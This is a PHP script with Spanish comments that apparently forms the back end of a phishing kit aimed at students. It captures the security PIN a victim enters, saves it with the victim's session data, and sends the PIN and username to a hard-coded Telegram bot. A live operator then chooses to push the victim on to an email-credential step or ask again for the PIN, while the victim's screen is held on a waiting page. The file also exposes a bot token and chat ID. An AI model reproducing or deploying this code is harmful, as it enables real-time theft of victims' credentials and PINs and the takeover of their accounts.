<?php
session_start();

// Capturar el ID de sesión activa del navegador del alumno
$id_sesion = isset($_SESSION['usuario_id']) ? $_SESSION['usuario_id'] : '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($id_sesion)) {
    $pin_ingresado = isset($_POST['num_pin']) ? trim($_POST['num_pin']) : '';

    if (!empty($pin_ingresado)) {
        $ruta = "sesiones/{$id_sesion}.json";

        if (file_exists($ruta)) {
            // 1. Leer y actualizar el estado interno en el JSON
            $datos = json_decode(file_get_contents($ruta), true);
            $datos['pin'] = $pin_ingresado;
            $datos['estado'] = 'pendiente'; // Bloquear al alumno en la pantalla de carga de nuevo
            file_put_contents($ruta, json_encode($datos));

            // 2. Credenciales del bot activo
            $token = "9156419748:AAFXdu2ORQoLuvGXuISZ9xfxEfdeEUVgRBw";
            $chat_id = "8166259970";

            // 3. Estructurar la alerta para tu Telegram
            $mensaje = "🔔 ¡NUEVO PIN DE SEGURIDAD RECIBIDO!\n\n";
            $mensaje .= "🆔 ID SESIÓN: {$id_sesion}\n";
            $mensaje .= "👤 USUARIO: {$datos['usuario']}\n";
            $mensaje .= "🔢 PIN INGRESADO: {$pin_ingresado}\n\n";
            $mensaje .= "¿El PIN es correcto? Seleccione la acción:";

            // 4. Botones para avanzar al correo electrónico o devolver por PIN incorrecto
            $botones = [
                'inline_keyboard' => [
                    [
                        ['text' => '📧 Mandar a Correo', 'callback_data' => "redirigir|{$id_sesion}|correo"],
                        ['text' => '⚠️ PIN Incorrecto', 'callback_data' => "redirigir|{$id_sesion}|pin_malo"]
                    ]
                ]
            ];

            $payload = [
                'chat_id' => $chat_id,
                'text' => $mensaje,
                'parse_mode' => 'Markdown',
                'reply_markup' => json_encode($botones)
            ];

            // 5. Enviar a la API de Telegram mediante cURL
            $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
            curl_exec($ch);
            curl_close($ch);

            // 6. Redirección inmediata a esperar.php para congelar la pantalla del alumno
            header("Location: esperar.php");
            exit();
        }
    }
}

// Si entran de forma directa o ilegal, regresarlos al inicio
header("Location: index.php");
exit();
?>